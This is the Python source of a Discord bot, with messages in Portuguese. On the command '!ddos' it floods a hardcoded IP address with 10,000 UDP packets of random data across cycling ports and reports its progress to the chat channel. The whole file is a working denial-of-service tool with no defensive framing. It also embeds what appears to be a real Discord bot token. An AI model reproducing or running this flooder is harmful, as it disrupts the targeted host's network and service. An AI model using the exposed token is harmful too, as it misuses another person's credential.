import discord
import asyncio
import random
import socket
from random import randint

client = discord.Client()

@client.event
async def on_ready():
	print("BOT ONLINE")
	print(client.user.name)
	print(client.user.id)
	print("-------------------")

@client.event
async def on_message(message):
	if message.content.lower().startswith('!ddos'):

		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		bytes = random._urandom(1490)

		await message.channel.send("Comecando ddos...")
		ip = "179.218.81.102"
		sent = 0
		port = 1

		for _ in range(10000):

			sock.sendto(bytes, (ip,port))
			sent = sent + 1
			port = port + 1
			await message.channel.send(f"Enviados {sent} bytes para {ip} pela porta {port}...")
			#print (f'Enviados {sent} pacotes para {ip} pela porta {port}... ' + '\033[;1m')

			if port == 65534:
				port = 1

		await message.channel.send("ddos terminado!")

client.run('NzA4MTE3ODk2NDc1MzEyMTYw.XrSsrw.x4sElCZeevWg2VmOdp_8OLywoNw')